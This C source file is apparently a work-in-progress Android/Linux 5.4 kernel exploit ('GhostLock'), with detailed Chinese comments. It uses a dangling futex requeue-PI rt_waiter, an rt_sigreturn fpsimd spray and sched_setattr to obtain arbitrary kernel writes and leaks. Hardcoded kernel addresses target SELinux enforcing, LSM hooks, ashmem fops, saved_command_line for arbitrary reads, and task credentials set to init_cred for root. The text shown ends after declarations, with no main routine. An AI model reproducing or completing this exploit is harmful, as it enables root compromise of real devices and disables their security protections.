/*
 * m1.c —— GhostLock 最小可用原语验证(M1): 一次 punch ⇒ 一次"任意 4 对齐地址上的 8 字节写" + 一次栈地址泄漏。
 *
 * 一手核实的前置(analysis/GHOST-CHANNEL-DEPTH-REBASE-20260927.md,
 *   analysis/KASLR-SLIDE-SOLVED-20260927.md, 真机 P72b):
 *  1) 悬空 rt_waiter 在受害者线程内核栈深度 [0x269,0x2B8](tree.pc 在 0x2B8);
 *  2) 覆盖通道 = rt_sigreturn 的 fpsimd 上下文回存: 内核把帧里 v[0..31] **原样 0x200 字节**
 *     拷进自己栈局部 fpstate@sp+0, Σ=0x340 ⇒ 覆盖 [0x131,0x340];
 *     换算(9/27 用设备构建重算): **窗口字节 = waiter 字节 + 0x48** ⇒ rt_waiter 起点 = 窗口第 9 字;
 *     (旧注释里的 "i ↔ waiter(i-0x88)" 是加法算错的陈旧值, 正确口径见下方 SR_AT 定义处);
 *  3) punch = sched_setattr(受害者 tid, nice=19) ⇒ __sched_setscheduler ⇒ rt_mutex_adjust_pi(p):
 *       waiter = p->pi_blocked_on(未被 remove_waiter 清掉的幽灵, 指向受害者自己的栈)
 *       next_lock = waiter->lock ⇒ rt_mutex_adjust_prio_chain(p, MIN_CHAINWALK, NULL, next_lock, NULL, p)
 *     链走里我们控制的量: prio(119 ≠ 线程 139 ⇒ 不早退), lock, task, tree{pc,right,left}
 *
 * 一次写怎么落地(k54src/kernel/locking/rtmutex.c:586..707 + rb_erase/enqueue):
 *   [5] raw_spin_trylock(&lock->wait_lock)  —— 借用 init_task+0x920(alloc_lock 0x918 /
 *       pi_lock 0x91C 之后的 8 字节 padding, 恒 0): wait_lock@0x920=0,
 *       waiters.rb_node@0x928=pi_waiters.rb_node=0(空树), rb_leftmost@0x930=0,
 *       owner@0x938=pi_top_task=NULL。
 *   [7] rt_mutex_dequeue = rb_erase_cached(节点=栈上假 waiter, root=init_task+0x928):
 *       假节点 {pc=0 ⇒ parent=NULL, right=T, left=0} ⇒ 单右子路径 ⇒
 *         __rb_set_parent_color(T, parent=0, black) ⇒ ***(T) = 0**   ← 任意 4 对齐地址上的零写
 *         __rb_change_child(node, T, NULL, root)     ⇒ root->rb_node = T
 *       [7] 还会把 waiter->prio/deadline 覆写成线程真值(写在我们的栈上, 无所谓)。
 *   rt_mutex_enqueue = rb_add_cached: root->rb_node=T ⇒ parent=T ⇒
 *     *(T+0x08 或 +0x10) = S(假节点地址 = 受害者内核栈里的真实 waiter 地址) ← 栈地址泄漏
 *     同时 leftmost=S ⇒ [9] 前 rt_mutex_top_waiter=S ⇒ wake_up_process(*(S+0x30)=init_task)
 *     —— 上游 cm54 载荷同样会走这一步(伪 waiter prio 最高 ⇒ 成 top ⇒ 唤醒 task 字段),
 *     对 TASK_RUNNING 的 idle 任务是早退空操作。
 *   [9] !rt_mutex_owner(lock)(=pi_top_task=NULL) ⇒ return 0, 链走干净结束。
 *
 * 观察量: T = init_uts_ns.name.sysname 里的对齐字 ⇒ *(T)=0 把 "Linux" 截成 "Lin",
 *   随后 enqueue 把 S(假节点=真实 waiter 内核栈地址)写进 sysname[12..19]
 *   ⇒ 一次 punch 同时证明"写成立"并泄漏栈地址; 无害, 重启即恢复。
 *   只做一次 punch(摘完之后再 punch 会读到被 enqueue 污染的树 ⇒ 不可预期)。
 *
 * 用法: m1 <slide_hex>          (在 adb shell 里跑)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <pthread.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/futex.h>
#include <sys/time.h>
#include <sys/resource.h>   /* setrlimit(RLIMIT_CORE): 触发 core_pattern 的管道 helper */
#include <sys/stat.h>       /* chmod: 把 helper 脚本摆成可执行 */
#include <sys/xattr.h>      /* setxattr(security.*) —— 只有 MAC 会拦的行为级判据 */
#include <sys/prctl.h>      /* PR_SET_NAME: 给 W 一个"每轮唯一"的 comm, 好在 /proc/sla 表里认出它 */
#include <setjmp.h>         /* sigsetjmp/siglongjmp: 接住 mmap 越界到不存在物理页的 SIGBUS */

/* 链接期地址(设备同构建 g2a88cd145def, analysis/kallsyms_g2a88cd145def.txt) */
#define LK_INIT_TASK   0xffffffc01292e200UL
#define LK_SELINUX_STATE 0xffffffc012b18000UL   /* B=.bss; DISABLE=y ⇒ enforcing 在 state+1 */
/* ===== LSM 钩子表(2026-09-27 深夜实测出的一张新路线图的目标) =====
 * 5.4 的 LSM 调用是 `call_int_hook(FUNC, 默认值, ...)` = 遍历 hlist_head; **链表空 ⇒ 直接返回
 * 那个"默认值"** ⇒ 对 inode_permission / file_permission / bprm_set_creds 这些"权限"钩子,
 * 默认值就是 **0 = ALLOW**(见 security/security.c)。所以把这些 hlist_head 的 `first` **清零**
 * 就等于"这一类检查全局不存在" —— 比去动 selinux_state 里那堆挤在一个 8 字节字里的布尔位
 * (initialized 必须留真、enforcing 必须清零 ⇒ 一笔对齐写做不到)干净得多:
 *   · 落点静态可读(security_hook_heads, .data), 不需要任何动态地址;
 *   · 写"0"用的正是**已在真机验证过的形状(1) 纯零写**(pc=dst-8, right=0, left=0 ⇒ 只有一笔
 *     `str xzr,[x8,#8]`, 连配对写都没有);
 *   · 幂等(再打还是 0), 而且摘下来的 hook 节点不会有人再去 deref(hlist_del 走 pprev,
 *     `*pprev = next` 也只是往已被清零的 first 再写 0)⇒ 不留悬空引用;
 *   · 这正是"启动时 LSM 还没注册"的合法中间态, 内核本来就支持。
 * 字段偏移全部由镜像 .rela 反查坐实(analysis/dump_obj.py selinux_hooks, 见 analysis/HOOKS-*.md):
 *   security_hook_heads = 0xffffffc01222b400(D, .data, 每个 head 8 字节 = hlist_head)
 *     +0x070 bprm_set_creds   (selinux_bprm_set_creds: exec 的 MAC 检查 + 域转换)
 *     +0x198 inode_permission (selinux_ 的 MAC **和 cap_ 的 DAC** 都在这条链上 ⇒ 清空 = 两类都免)
 *     +0x220 file_permission
 *     +0x288 file_open        (selinux_file_open: open 的 file { open } 检查) */
#define LK_SECURITY_HOOK_HEADS 0xffffffc01222b400UL
#define HK_BPRM_SET_CREDS   0x070
#define HK_INODE_PERMISSION 0x198
#define HK_FILE_PERMISSION  0x220
#define HK_FILE_OPEN        0x288
/* ★ 上面这套"清 LSM 钩子链头"在真机上**已判废**(run_hooks1: 相1 第一发 punch 之后立刻重启):
 *   cap_inode_permission/selinux_inode_permission 同时还承担 isec 的惰性初始化, 只摘这一条链
 *   ⇒ 剩下的 selinux 钩子去 deref 没初始化的 inode->i_security ⇒ 炸。见
 *     analysis/GHOST-LSM-HOOKS-NULLING-20260927.md §7(负结果, 定义保留作为证据)。
 * 于是回到"只改 enforcing 那一字节"的写法, 而它缺的只是一个**当"值"用的静态可写地址**:
 *   要求 (V>>8)&0xff==0(enforcing=0) 且 (V&0xff)!=0(同字里那个 bool 保持真) 且 V 可被内核写
 *   且砸 V 的 8 字节不疼。全 kallsyms 扫下来唯一干净的答案是 nls 的码页转换表:
 *     c2u_8A.433 = 0xffffffc012030040 (type d = .data, 对象跨度 512 字节, lo16=0x0040)
 *   ⇒ byte0=0x40(真), byte1=0x00(enforcing 没了), byte2..7 全非 0(policycap 一类=授权, 无害);
 *     配对写 *(V)=pc 只会把两个 u16 转换项改成内核指针的低半 ⇒ 最坏某码页文件名转码错字, 不 deref。
 *   (slide 是 2MB 对齐 ⇒ 不影响低 16 位 ⇒ 运行时 V = 链接期 V + slide 仍满足条件 ✔) */
#define LK_NLS_HOLE          0xffffffc012030040UL   /* c2u_8A.433: 可写的"值"仓库 */
/* ★★★ 2026-09-28: "值"这一格的**正确选点**(推翻上面 nls 那套推理) ★★★
 * 5.4 的 struct selinux_state 前 8 字节由本机反汇编逐一定死(field_consumers.py):
 *   +0 名称未定        (ldrb 55 处, hook 前置检查之一; 上游该偏移为 disabled) —— 必须**保持非 0**
 *   +1 enforcing      (sel_write_enforce 的 `strb w8,[x21,#1]`) —— 我们要的**清零**目标
 *   +2 checkreqprot   (只有 selinux_mmap_file / selinux_file_mprotect 读 ⇒ 置 1 只会更宽松)
 *   +3 initialized    (62 处 ldrb, 全在 hook 入口) —— 必须**保持非 0**
 *   +4..+b policycap[](写它的是 security_load_policy; `ldr w` 读 +4 的那些站点是别名误报,
 *                      8 字节字段不可能落在 +4 ⇒ 这一格只能是 bool/对齐填充)
 * 形状(2) 的约束: 写宽固定 8 字节、而目的 = (pc&~3)+8 只能 4 对齐 ⇒ 只能整字写;
 *   而"值"V 会被配对写 `*(V)=pc` 解引用
 *   ⇒ V 必须**可写**, 且 V 那 8 字节被踩成指针后**没人当指针用**。
 * 于是 V 要满足 (V>>8)&0xff==0 且 V&0xff!=0 ⇔ **V mod 0x10000 ∈ [0x08,0xff]**。
 * 选 **V = __log_buf 内部**: printk 环形缓冲是 `char[]`(0x12b2d95c, 0x20000), 内容只被"日志记录
 * 走查器"当**字节**读(带 buf_len 边界钳制), 没有任何地方把它的字节当指针 ⇒ 配对写砸进去
 * 最坏就是 dmesg 里多几条乱码。写进 selinux_state 的字节串 =
 *   20 00 b3 12 c0 ff ff ff ⇒ +0 非 0(名称未定) / **enforcing=0** / checkreqprot=真(同向) /
 *                               initialized=真 / policycap[0..3]=真(惰性布尔) */
#define LK_LOGBUF_HOLE       0xffffffc012b30020UL
/* ===== 2026-09-28: 把"劫持静态 fops ⇒ 读 .data"接上 (因为 kprobe 路线被 DAC 判死) =====
 * `stats_read@0xffffffc010f73220`(逐条反汇编核过):
 *     ldr x3,[x0,#0xd8]        ; x3 = file->private_data   ← **只当线性地址, 从不解引用**
 *     mov w4,#0x3ed0 ; movk w4,#6,lsl #16   ; w4 = available = 0x63ed0 (约 400KB)
 *     bl simple_read_from_buffer(to=用户buf, count=用户给, ppos=&file->f_pos, from=x3, avail)
 * ⇒ 只要让 `open("/dev/ashmem")` 用上我们铺在带里的伪 file_operations(`.owner=0` 过 fops_get,
 *   `.read=stats_read`), 而 misc_open 又会把 private_data 设成 **&ashmem_misc**(一个静态 .data
 *   地址) ⇒ 得到"从 0x12a55960+slide 往后 400KB、可读可重复、偏移自增"的**内核 .data 泄露**。
 * ★ 自带三重校验: 泄露出来的第 0x10 格就是 `misc.fops`, 它应当**正好等于我们写进去的那个
 *   带内地址** ⇒ 一次同时证实"指针写落了 + slide 对 + 带内地址算得准"。
 * ★ 判据非恒真: 真的 ashmem_fops **没有 .read** ⇒ 劫持没落则 `read()` 返回 -EINVAL(22)。 */
#define LK_STATSD_READ       0xffffffc010f73220UL
#define ASH_FOPS_OFF         0x10                 /* struct miscdevice.fops 的偏移 */
/* 覆盖窗第 i 格 ⇄ 内存地址 S + 8*i - 0x48 ⇒ 想放在 S+0x100 就是 i=41 */
#define FOPS_BASE_WORD       41
static int ASHLEAK = 0;
static uintptr_t LEAK_FOPS_ADDR;                  /* 伪 fops 的运行时地址(= 我们写进 misc.fops 的值) */
/* tracefs kprobe 泄漏时给自己挑一个"几乎不会撞车"的 prio 标记:
 * main 现在是 nice 0 ⇒ prio/static_prio = 120; 临时改成 **nice 17 ⇒ (137,137)**。
 * Android 上 nice 17 极少见(后台是 10 ⇒ 130), 而 (137,137) 这个**二元组**同时出现两次以上
 * 就足以认定"这是我们自己的 task"(ftrace 那行的 comm 是**唤醒者**所在上下文的, 中断里可能是
 * swapper ⇒ 不能拿 comm 当筛子, 只能拿 prio 二元组)。用完立刻改回 nice 0。 */
#define LEAK_NICE 17
#define LEAK_PRIO (120 + LEAK_NICE)
/* 读通道的每一窗(相对 S 的偏移):
 *   第 1 窗在**带内**(S+0x100) ⇒ 可以自己铺标记 ⇒ 能做"读回已知值"的自洽正对照;
 *   其余落在 futex/schedule 早就返回了的**死帧**里 ⇒ 配对写只会盖掉那 8 字节死数据 ⇒ 零风险,
 *   而 W 那条 syscall 路径在栈上一定留过 `current`(=W 的 task_struct)一类指针 ⇒ 扫出来即可。 */
static const long RD_OFF[8] = { 0x100, -0x88, -0x288, -0x488, -0x888, -0xc88, -0x1088, -0x1488 };
/* 读通道副作用要认清: 指针写的**配对写会把 pc 落在"打印起点 C"那 8 个字节上** ⇒
 * 只能从"坏了也无所谓"的地方开始印: 带内载荷槽 ✔ / W 自己栈的死帧 ✔ / 候选 task 的
 * +0x60 那一格(state: W 正在用户态跑着, 写坏它最多让 W 自己卡住) ✔ —— 别的对象一律不碰。
 * 验真用 `task->stack`(偏移 0x68)= 那块 16 KB 栈的基址 = S & ~0x3fff(S 本身已知)✔✔✔
 * (候选的收集/排序函数 note_candidates() 放在 hexq/say 之后) */
#define STACK_MASK (~0x3FFFUL)
static uintptr_t CAND[8]; static int ncand;      /* 从栈里扫出来的"像 task_struct"的候选 */
static volatile uintptr_t h_cand;                /* 当前正在验真的候选(相 11 用) */
static int ci_now;                               /* 验到第几个候选 */
#define LK_ASHMEM_MISC 0xffffffc012a55960UL  /* D=.data 的 struct miscdevice; +0x10=fops */
/* ★ 真机一手证实(9/28, cm57/tsfind.c): /proc/sla/*_stats 的过界读里有一张"每任务一条"的表,
 *   记录 = { task_struct *(+0), 若干 u32, comm[16](+40) }, 步长 72 ⇒ **给 comm 就能拿到 task 地址**
 *   (12 条记录的 ptr 与窗口里按 prio/stack/cred 签名独立找到的 task 对象**逐个对上**, 体内 comm 也一致)。
 *   于是"我们自己(W 线程)的 task_struct"是一个**读得到的动态地址**, 而
 *   `task->cred(+0x848)`/`task->real_cred(+0x840)` 就是两个已知的可写核地址 ⇒
 *   两发形状(2) 指针写把它们顶成 `init_cred` ⇒ uid0 + 全 caps(等价于 commit_creds(prepare_kernel_cred(0)))。 */
#define LK_INIT_CRED   0xffffffc01293d528UL
#define TASK_CRED_OFF  0x848                  /* task->cred(主观) */
#define TASK_RCRD_OFF  0x840                  /* task->real_cred(客观) */
#define SLA_REC_STRIDE 72
#define SLA_REC_COMM   40
#define LK_MODPROBE_PATH 0x1293db00UL           /* D=.data "modprobe_path" */
#define LK_UTS           0xffffffc01292d350UL
#define LK_INIT_UTS      LK_UTS

/*
 * 假 rt_mutex 与写目标都放进 init_uts_ns.name.sysname 的"运行时保证为 0"的空洞里。
 * 镜像实测(analysis 里 dump 过): sysname = +0x04..+0x44, 其中 +0x09..+0x44 全 0。
 *   L = init_uts_ns + 0x20   假 rt_mutex:  wait_lock@L+0x00=0, rb_node@L+0x08,
 *                            rb_leftmost@L+0x10=0, owner@L+0x18=0
 *   T = L + 0x18             写目标(= L 的 owner 槽, 本来就是 0)
 * 链走里每个被解引用的地址都落在这段 0 里 ⇒ 不会踩野指针:
 *   [5] trylock(L)=0 成功 ⇒ 临时写 1 再解锁回 0(纯空洞, 无害)
 *   [7] rb_erase: root->rb_node = T; *(T) = tree.pc
 *       ⇒ root 非空 ⇒ rb_add_cached 从 T 往下走: 读 *(T+0x40)=sysname 尾=0
 *         ⇒ 139 < 0 假 ⇒ 取右子槽 T+8(=L+0x20=sysname[0x28]=0) ⇒ 终止 ⇒ *(T+8)=S
 *       并且"新节点不是 leftmost" ⇒ rb_leftmost 保持 0
 *   [9] owner=*(L+0x18)=0 ⇒ 出口; leftmost==0 ⇒ **不做 wake_up_process** ⇒ return 0
 * 观察: S(受害者内核栈上 waiter 的真实地址) 落在 sysname[0x28..0x2f] ⇒ uname() 直读。
 */
#define UTS_LOCK_OFF   0x20
#define UTS_TGT_OFF    0x50          /* 旧值 0x08; 真正生效的是下面的 TG_OFF(见它那段注释) */
/*
 * 写目标 T = init_uts_ns(0x1292d350) + 0x08 = name.sysname[4..11] 那个对齐字。
 * 镜像里实测(analysis: dump init_uts_ns): +0x04 "Linux\0"、+0x08..+0x40 全 0。
 * 为什么必须挑这种"邻居是 0"的目标 —— 反汇编 rt_mutex_adjust_prio_chain+rb_erase:
 *   [7] dequeue: root->rb_node = right(T); *(T) = tree.pc    ← 我们要的写
 *   随后 rt_mutex_enqueue 从 root->rb_node=T 往下走树:
 *       ldr w12,[T,#0x40]  比较 prio ⇒ 选 slot = T+8 或 T+0x10
 *       ldr x13,[T,+8/+0x10] ⇒ **若非 0 就当节点指针继续下潜 ⇒ 解引用垃圾 ⇒ panic**
 *       (上一轮打 sysctl_bootid 就是这么炸的: bootid[8..15] 是随机 ASCII 十六进制)
 *       slot 为 0 ⇒ 就地插入 *(T+8)=S(泄漏栈地址) 且 w8=0 ⇒ **rb_leftmost 不更新**
 *   [9] 出口: ldr x8,[lock,#0x10](=leftmost) cbz ⇒ leftmost==NULL 直接跳过
 *       wake_up_process() ⇒ 不需要假 task, 也不碰 idle 任务 ✓
 */
#define LK_UTS_NAME_WORD 0xffffffc01292d358UL
#define LOCK_OFF_IN_TASK 0x920                /* 见文件头: padding + pi_waiters + pi_top_task */

/* 用头文件里的真常量(别手写: FUTEX_CMP_REQUEUE_PI=10, 不是 11) */
#define FW  FUTEX_WAIT_REQUEUE_PI
#define FCMP FUTEX_CMP_REQUEUE_PI
#define FLOCKPI FUTEX_LOCK_PI
#define FUNLOCKPI FUTEX_UNLOCK_PI
#define FP  FUTEX_PRIVATE_FLAG
#define MATCH_ANY 0xffffffffu

static uintptr_t SLIDE;
static uintptr_t FAKE_LOCK, FAKE_TGT;   /* 都在 init_uts_ns 的 sysname 零洞里 */
static void say(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static long read_prio(int tid);
/* 三个 futex 必须各占一页(不是 4 字节对齐的问题!):
 *   get_futex_key() 对 private futex 取 key=(mm, address-PAGE_OFFS) ⇒ 同页 = 同一个 futex
 *   ⇒ futex_wait_requeue_pi 的 match_futex(&q.key,&key2) 命中 ⇒ -EINVAL,
 *   ⇒ futex_requeue 的 lookup_pi_state() 拿不到 uaddr2 上的 pi_state ⇒ -EFAULT。
 * MAP_SHARED|MAP_ANONYMOUS 保证页稳定可 pin。 */
static uint32_t *C, *PI, *N;
static void init_futex_words(void) {
  char *m = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (m == MAP_FAILED) { perror("mmap futex"); exit(1); }
  C = (uint32_t *)m;
  PI = (uint32_t *)(m + 0x1000);
  N = (uint32_t *)(m + 0x2000);
  /* 必须先在用户态真写过(缺页把三个页都实例化): 内核 futex 侧用
   * get_futex_value_locked() 的 inatomic 拷贝(页不在=直接 -EFAULT/EINVAL),
   * 只 mmap 不碰的共享匿名页读操作会挂到 empty_zero_page 上。 */
  volatile uint32_t *t;
  t = C;  *t = 0; t = PI; *t = 0; t = N; *t = 0;
  fprintf(stderr, "[I] futex words C=%p PI=%p N=%p\n", (void *)C, (void *)PI, (void *)N);
}
static volatile int p_tid;
static volatile int stop_all;

/* 状态机 */
static volatile int st_c_locked;     /* W 拿到了 C */
static volatile int st_w_sleeping;   /* W 已进入 WAIT_REQUEUE_PI(返回后即成幽灵) */
static volatile int st_pi_locked;    /* O 拿到了 PI */
static volatile int st_ghost;        /* W 的 futex 已返回 ⇒ pi_blocked_on 悬空 */
static volatile int st_payload;      /* 覆盖层已放置 */
static volatile int st_punch_done;
static volatile int st_punch_ret = -999, st_punch_errno;

static char name_hex_before[1024], name_hex_after[1024];

struct sched_attr_t {
  uint32_t size; uint32_t sched_policy; uint64_t sched_flags;
  int32_t sched_nice; uint32_t sched_priority;
  uint64_t sched_runtime; uint64_t sched_deadline; uint64_t sched_period;
};
static long fx(uint32_t *a, int op, int val, struct timespec *to, uint32_t *a2, int val3) {
  return syscall(SYS_futex, a, op | FP, val, to, a2, val3);
}
/* LOCK_PI/WAIT 的 timeout 都是 CLOCK_* 绝对时刻 ⇒ 要么 NULL(永久等), 要么 now+秒 */
static void abs_after(struct timespec *ts, int sec) {
  clock_gettime(CLOCK_MONOTONIC, ts);
  ts->tv_sec += sec;
}

/* ---------------- 覆盖层: rt_sigreturn fpsimd 喷洒 ---------------- */
#define SR_REGS0 0x138
#define SR_FSP   0x230
#define SR_FPC   0x238
#define SR_PSTATE 0x240
#define SR_RES   0x250
#define SR_FB    (SR_RES + 0x10)
/* 几何(9/27 用设备构建逐条重算, 旧值 0x88 是加法算错: 0xc0+0xd0+0x1a0=0x330 而不是 0x350):
 *   链 A(幽灵所在): __arm64_sys_futex(0xc0) + do_futex(0xd0) + futex_wait_requeue_pi(0x1a0)
 *     ⇒ SP_A3 = E-0x330,  rt_waiter = SP_A3+0x98 = **E-0x298**, 对象 [E-0x298, E-0x248)
 *   链 B(覆盖通道): __arm64_sys_rt_sigreturn(0x30) + restore_sigframe(0x60)
 *                    + restore_fpsimd_context(0x30+0x220=0x250)
 *     ⇒ SP_B3 = E-0x2E0;  实测 0x102b87d0: `mov x0,sp; mov w2,#0x200; bl __arch_copy_from_user`
 *     ⇒ 载荷落在 [E-0x2E0, E-0xE0)  ⇒ 窗口字节 i ↔ 地址 E-0x2E0+i
 *   ⇒ i = (E-0x298+j) - (E-0x2E0) = **j + 0x48** ⇒ waiter 起点 = 第 **9** 字, prio = 第 **17** 字
 *   (旧代码把 0x88 当成 waiter 起点用 ⇒ 载荷整体高了一格半, w[0] 落在真对象的 deadline 上,
 *    真 prio 字段仍是悬空帧的残值 ⇒ 每一发 punch 都照旧走进链走 ⇒ 之前所有"炸"都跟载荷无关) */
#define SR_AT(j) (SR_FB + 0x48 + (j))     /* 假 waiter 的第 j 个字节 ↔ 栈深度 0x298-j */
static unsigned char *FRM;

static void p64(unsigned char *b, size_t o, uint64_t v) { memcpy(b + o, &v, 8); }
static void p32(unsigned char *b, size_t o, uint32_t v) { memcpy(b + o, &v, 4); }

__asm__(
    ".text\n.align 4\n.globl sr_call\n"
    "sr_call:\n"
    "   stp   x29, x30, [sp, #-32]!\n"
    "   mov   x29, sp\n"
    "   mov   x1, sp\n"
    "   str   x1, [x0, #0x230]\n"          /* 帧 sp */
    "   str   x1, [x0, #0x140]\n"          /* regs[1] */
    "   adr   x9, 9f\n"
    "   str   x9, [x0, #0x238]\n"          /* 帧 pc */
    "   str   xzr, [x0, #0x228]\n"         /* regs[30] */
    "   str   xzr, [x0, #0x240]\n"         /* pstate */
    "   stp   x19, x20, [x0, #0x1d0]\n"
    "   stp   x21, x22, [x0, #0x1e0]\n"
    "   stp   x23, x24, [x0, #0x1f0]\n"
    "   str   x25, [x0, #0x200]\n"
    "   str   x26, [x0, #0x208]\n"
    "   str   x27, [x0, #0x210]\n"
    "   str   x28, [x0, #0x218]\n"
    "   mov   sp, x0\n"
    "   mov   x8, #139\n"
    "   svc   #0\n"
    "9:\n"
    "   mov   x11, x0\n"
    "   mov   sp, x1\n"
    "   mov   x0, x11\n"
    "   ldp   x29, x30, [sp], #32\n"
    "   ret\n");
extern long sr_call(void *frame);

static int WP_PRIO = 119;
static int SHAPE = 0;        /* 0 = 形状(3)(root->rb_node=T 那版), 1 = 形状(1)(纯零写) */
static int WAITER_WORD = 9;  /* 假 waiter 起点在覆盖窗口里的 8 字节字下标(设备反汇编重算: 9; prio=17) */
/* benign 模式用的"立刻退出链走"的载荷值: 非 RT 任务时 task_to_waiter(task) 给出
 * prio = MAX_PRIO(140) / deadline = U64_MAX ⇒ rt_mutex_waiter_equal 命中 ⇒ [3] 直接出。
 * (不是 139! 120+nice 是"被 pi 提升后"的 prio, 比较用的是那个 static waiter。) */
static uint64_t WP_DEADLINE = 0;
/* probe 模式(安全几何探针): 把窗口里 [PROBE_LO, PROBE_LO+PROBE_N) 个 8 字节字填成
 * PROBE_MATCH(=受害者当前 prio 120, 被 pi 提升后仍是 120), 其余填 0。
 *   链走 [3] 的判据是 waiter->prio == task->prio(非 RT 时压根不比 deadline) ⇒
 *   真实 waiter 的 prio 字若落在"120 区" ⇒ 立刻 out_unlock_pi, **不解引用任何指针** ⇒ 存活;
 *   若落在 0 区 ⇒ prio 不等 ⇒ 继续走, 而此时 pc/lock 读到的都是 0 或 120 这种小整数
 *   ⇒ 解引用必炸 ⇒ "存活 / 重启" 就是 "prio 字在不在探针区" 这一个比特。
 * 先跑全区(probe 0 64): 存活 ⇒ 覆盖被证实; 炸 ⇒ 通道根本没够到 waiter(推翻模型)。
 * 之后二分窗口, 6 次之内就能把 prio 字的精确偏移钉死(不需要知道 S 的绝对值)。 */
static int FILL_PROBE = 0, PROBE_LO = 0, PROBE_N = 64;
static uint64_t PROBE_MATCH = 120;   /* 基础填充: 让 [3] 命中 ⇒ 早退 ⇒ 存活 */
static uint64_t PROBE_POISON = 119;  /* 探针区: prio 不等 ⇒ 继续走 ⇒ lock 读到小整数 ⇒ 必炸 */
static int PROBE_MATCH_SET = 0;      /* 命令行显式给了 match ⇒ 别用实测值覆盖 */
static int NCOPY = 0;                /* 一次铺几份假 waiter(同余类全覆盖), 0=只铺 1 份 */
/* nospray: 幽灵照常制造, 但**完全不铺覆盖层**(不进 sr_call) ⇒ punch 读的是 futex 留下的
 * 原始悬空字节。它是唯一能把"覆盖层真的够到了幽灵"和"punch 这个幽灵本身就会炸"
 * 分开的对照 —— 9/27 那次"全区填 120 仍然炸"必须有它才能判读。 */
static int NO_SPRAY = 0;
/* 直接读内核给的值: /proc/self/task/<tid>/stat 的第 18 个字段。
 * ★ 设备实测(cat /proc/self/stat 的 nice 0 进程在第 18/19 字段是 "20 0")证明
 *   /proc 的第 18 字段 = **p->prio - 100**, 不是 p->prio 本身!
 *   ⇒ 这里 +100 还原成 rt_mutex_adjust_pi 里 `ldr w9,[task,#0xb4]` 比的那一个。
 *   (9/27 第一轮探针把 20 当 prio 填进窗口 ⇒ 120≠20 ⇒ 每次必炸, 白跑 5 轮。) */
static long read_prio(int tid) {
  char path[64], buf[1024];
  snprintf(path, sizeof path, "/proc/self/task/%d/stat", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) return -1;
  ssize_t n = read(fd, buf, sizeof buf - 1);
  close(fd);
  if (n <= 0) return -1;
  buf[n] = 0;
  char *p = strrchr(buf, ')');        /* comm 里可能有空格/括号, 从最后一个 ')' 之后数 */
  if (!p) return -1;
  p++;
  long v = -1;
  for (int f = 3; f <= 18; f++) {     /* 第 18 字段 = priority */
    while (*p == ' ') p++;
    if (!*p) break;
    char *e = p;
    while (*e && *e != ' ') e++;
    if (f == 18) v = strtol(p, NULL, 10) + 100;   /* ★ /proc 给的是 p->prio-100 */
    p = e;
  }
  return v;
}

#define STATS_READ       0xffffffc010f73220UL   /* T 符号, 链接期地址 */
#define MISC_FOPS_OFF    0x10                    /* struct miscdevice.fops */
#define LK2_OFF          0x68                    /* 假 lock#2 = init_uts_ns+0x68(nodename 零洞) */
/* ===== 读通道 + 布局(全部来自镜像 .rela / 反汇编, 见 analysis/CMDLINE-READ-ORACLE-20260927.md) =====
 * cmdline_proc_show@0x100be268: ldr x1,[x8,#0x600] (x8=0xffffffc012b27000) ⇒ seq_puts(m, saved_command_line)
 * saved_command_line 是 **.bss 里的 char\*(可写)** ⇒ 一发形状(2) 的指针写把它改指到任何"可写"
 * 内核地址 P, 之后 `cat /proc/cmdline` 就把 P 处当字符串印到第一个 NUL ⇒ **可重复的任意内核读**,
 * 不需要堆地址、不需要 CFI 兼容函数、SELinux 只要求 proc_cmdline:file read(shell 实测放行)。 */
#define LK_SAVED_CMDLINE 0xffffffc012b27600UL
#define LK_TEXT_BASE     0xffffffc010080000UL   /* _text(链接期); 运行时 = +SLIDE */
#define TEXT_LEN         0x1520000UL            /* _etext - _text(逐字同构建) */
#define OFF_T_STACK      0x068   /* init_task.stack      <- init_thread_union(rela) */
#define OFF_T_TASKS      0x6b0   /* init_task.tasks.next <- 自环(rela) ⇒ 完美的正对照 */
#define OFF_T_REALCRED   0x840   /* rela: <- init_cred; 又被 prepare_kernel_cred 的 ldr [x21,#0x840] 坐实 */
#define OFF_T_CRED       0x848   /* rela: <- init_cred */
#define LK_INIT_CRED     0xffffffc01293d528UL
static int HIJACK = 0;
/* 相位机: 0=泄漏 S(SHAPE=2, 假 lock 在 uts 零洞); >=1 形状(2) 幂等写, **假 lock 搬进带内 S-0x48**
 * ⇒ 每一轮重铺都顺手把这块假 lock 清零 ⇒ "一个 boot 只能吃一发"的限制从根上解除。 */
static long SP_LIST[12] = { -0x98, -0x78, -0x58, 0x1b8, 0x1f0, 0x220 };
static int C1UTS = 0;   /* A/B: 相1 的 C 换回 uts+0x10(真机已验证可读的落点) */
#define LK_AVENRUN 0xffffffc012b2b660UL   /* .bss: /proc/loadavg 的第一列就是 avenrun[0] */
static const char *PROBE_PATH = "/proc/cmdline";   /* avtest 时换成 /proc/loadavg */
static int AVTEST = 0;
static int SCANY = 0;   /* 显式给了 sp= 才启用"按 SP_LIST 扫栈"那些相(否则会盖掉提权相) */
/* 通用单发写接口(见文件尾注释): 一次调用 = 一笔有效写 */
static uintptr_t DST = 0;                 /* 目的地址(链接期, 运行时 +slide); 0 = 不用这个模式 */
static long VAL_ABS = -1;                 /* 值的链接期地址; -1 = 用 S 相对量 */
static long VAL_REL = 0;                  /* S 相对量 */
static const char *PROBE_TXT = "/proc/cmdline";
static uintptr_t EXPECT = 0;              /* 期望读到的 8 字节(运行时地址) */
static int NSP = 6;   /* 相 1..NSP: 依次把读指针指到 S+SP_LIST[i](扫栈找 current 的真身) */
static int NPH = 6;                          /* 跑到第几相(不含 0)为止 */
static int ROUNDS_MAX = 600;                /* 单相最多打多少发还没落地就放弃 */
static long SP_REL = -0x98;                  /* 第 2 相: 读 S+SP_REL(带外的保存寄存器区) */
static volatile int h_phase;                 /* 当前相 */
static int h_lastlog = -1;   /* 只为了“每相至少打一行载荷日志” */
static int CTL = 0;
/* main 自己的 task_struct + 靶子开关(见 sla_child_scan 的说明) */
static uintptr_t MTASK;
static int USEMAIN = 0;
